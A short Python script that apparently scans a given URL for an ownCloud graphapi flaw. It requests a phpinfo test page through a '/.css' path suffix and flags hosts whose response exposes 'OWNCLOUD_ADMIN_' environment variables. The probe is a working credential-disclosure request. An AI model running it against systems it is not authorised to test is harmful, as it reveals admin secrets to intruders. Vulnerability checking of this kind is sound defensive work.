#!/usr/bin/python3
import requests
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_phpinfo(url):
    """
    Checks if a given URL contains 'OWNCLOUD_ADMIN_' in its response.

    :param url: The URL to check
    :return: True if the condition is met, otherwise False
    """
    try:
        response = requests.get(url, verify=False)  # Bypass SSL verification
        if response.status_code == 200 and 'OWNCLOUD_ADMIN_' in response.text:
            return True
    except requests.RequestException:
        pass
    return False

def check_single_url(url):
    """
    Checks a single URL and writes it to the output file if valid.

    :param url: The single URL to check
    :param output_file: Path to the output file for valid URLs
    """
    # Append both URL variants to check against the input URL
    url_variants = [
        url + "owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css",
        url + "apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css"
    ]

    # Check each variant and log the results
    for variant in url_variants:
        print(f'url {variant}')
        if check_phpinfo(variant):
            print("Vulnerable: " + variant)
            return  # Exit after finding the first valid URL

    print("Invalid: " + url)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Check a single URL.')
    parser.add_argument('-u', '--url', required=True, help='Single URL to check')

    args = parser.parse_args()

    # Check the provided single URL
    check_single_url(args.url)
